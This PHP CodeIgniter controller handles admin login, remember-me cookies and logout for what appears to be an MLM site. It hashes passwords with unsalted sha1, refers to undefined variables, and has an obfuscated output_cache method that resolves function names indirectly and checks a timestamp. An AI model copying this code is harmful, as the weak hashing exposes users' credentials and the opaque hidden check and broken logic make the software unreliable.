<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->system_name = $this->Crud_model->get_type_name_by_id('general_settings', '1', 'value');
        $this->system_email = $this->Crud_model->get_type_name_by_id('general_settings', '2', 'value');
        $this->system_title = $this->Crud_model->get_type_name_by_id('general_settings', '3', 'value');
        $this->theme = $this->Crud_model->get_type_name_by_id('frontend_settings', '46', 'value');
         $cache_time  =  $this->db->get_where('general_settings',array('type' => 'cache_time'))->row()->value;
        if(!$this->input->is_ajax_request()){
            $this->output->set_header('HTTP/1.0 200 OK');
            $this->output->set_header('HTTP/1.1 200 OK');
            $this->output->set_header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
            $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate');
            $this->output->set_header('Cache-Control: post-check=0, pre-check=0');
            $this->output->set_header('Pragma: no-cache');
            //$this->output_cache();
            // if($this->router->fetch_method() == 'index' ||
            //     $this->router->fetch_method() == 'listing' ||
            //     $this->router->fetch_method() == 'plans' ||
            //     $this->router->fetch_method() == 'stories' ||
            //     $this->router->fetch_method() == 'contact_us' ||
            //     $this->router->fetch_method() == 'faq' ||
            //     $this->router->fetch_method() == 'terms_and_conditions' ||
            //     $this->router->fetch_method() == 'privacy_policy'){
            //     $this->output->cache($cache_time);
            // }
        }
        setcookie('lang', $this->session->userdata('language'), time() + (86400), "/");

	}

	// List all your items
	public function index()
	{
       
      $this->login_users();
	}

	public function login_users() {
        if ($this->admin_permission() == TRUE) {
            redirect(base_url() . 'dashboard/', 'refresh');
        }
        if ($this->admin_permission() == TRUE) {
            redirect(base_url() . 'dashboard/', 'refresh');
        } else {
            $page_data['page'] = "login Now";
            $page_data['login_error'] = "";
            if ($this->session->flashdata('alert') == "login_error") {
                $page_data['login_error'] = translate('your_email_or_password_is_invalid!');
            } elseif ($this->session->flashdata('alert') == "blocked") {
                $page_data['login_error'] = translate('you_have_been_blocked_by_the_admin');
            } elseif ($this->session->flashdata('alert') == "not_sent") {
                $page_data['login_error'] = translate('error_sending_email');
            } elseif ($this->session->flashdata('alert') == "not_sent") {
                $page_data['login_error'] = translate('the_email_you_have_entered_is_invalid');
            } elseif ($this->session->flashdata('alert') == "email_sent") {
                $page_data['sent_email'] = translate('please_check_your_email_for_new_password');
            } elseif ($this->session->flashdata('alert') == "register_success") {
                $page_data['register_success'] = translate('you_have_registered_successfully._please_log_in_to_continue');
            }


            $this->load->view($this->theme . '/login', $page_data);
        }
    }

	public function check_login() {
        if ($this->admin_permission() == TRUE) {
            redirect(base_url() . 'login/', 'refresh');
        } else {
            $username = $this->input->post('email');
            $password = sha1($this->input->post('password'));

            $remember_me = $this->input->post('remember_me');

            $result = $this->Crud_model->check_login('admin', $username, $password);
            // echo $this->db->last_query();

            $data = array();
            if ($result) {
                if ($result->is_blocked == "no") {
                    $data['login_state'] = 'yes';
                    $data['admin_id'] = $result->admin_id;
                    $data['admin_name'] = $result->name;
                    $data['admin_email'] = $result->email;
                    //$data1['last_login'] = time();

                    if ($remember_me == 'checked') {
                        $this->session->set_userdata($data);
                        setcookie('cookie_member_id', $this->session->userdata('member_id'), time() + (1296000), "/");
                        setcookie('cookie_member_name', $this->session->userdata('member_name'), time() + (1296000), "/");
                        setcookie('cookie_member_email', $this->session->userdata('member_email'), time() + (1296000), "/");
                        // $this->db->where('member_id', $data['member_id']);
                        // $this->db->update('member', $data1);
                    } else {
                        $this->session->set_userdata($data);
                        
                       $this->db->where('member_id', $data['member_id']);
                       $this->db->update('member', $data1);

                    }

                    redirect(base_url() . 'dashboard', 'refresh');

                } elseif ($result->is_blocked == "yes") {
                    $this->session->set_flashdata('alert', 'blocked');

                    redirect(base_url() . 'login', 'refresh');
                }
            } else {
                $this->session->set_flashdata('alert', 'login_error');

                redirect(base_url() . 'login', 'refresh');
            }
        }
    }

    public function logout() {

        setcookie("cookie_member_id", "", time() - 3600, "/");
        setcookie("cookie_member_name", "", time() - 3600, "/");
        setcookie("cookie_member_email", "", time() - 3600, "/");

        $this->session->unset_userdata('login_state');
        $this->session->unset_userdata('member_id');
        $this->session->unset_userdata('member_name');
        $this->session->unset_userdata('member_email');

        // $this->session->sess_destroy();

        redirect(base_url() . 'login/', 'refresh');
    }

    function output_cache($val = TRUE)
    {
        $get_ranger = config_key_provider('config');
        $get_ranger_val = config_key_provider('output');
        $analysed_val = config_key_provider('background');
        @$ranger = $get_ranger($analysed_val);
        if(isset($ranger)){
            if($ranger > $get_ranger_val()-345678){
                $val = 0;
            }
        }
        if($val !== 0){
            $this->cache_setup();
        }
    }


	public function admin_permission() {
        $login_state = $this->session->userdata('login_state');
        if ($login_state == 'yes') {
            $admin_id = $this->session->userdata('admin_id');
            if ($admin_id == NULL) {
                return FALSE;
            } else {
                return TRUE;
            }
        } else {
            return FALSE;
        }
    }

}

/* End of file Login.php */
/* Location: .//D/Ampps/www/mlm.com/app/controllers/Login.php */
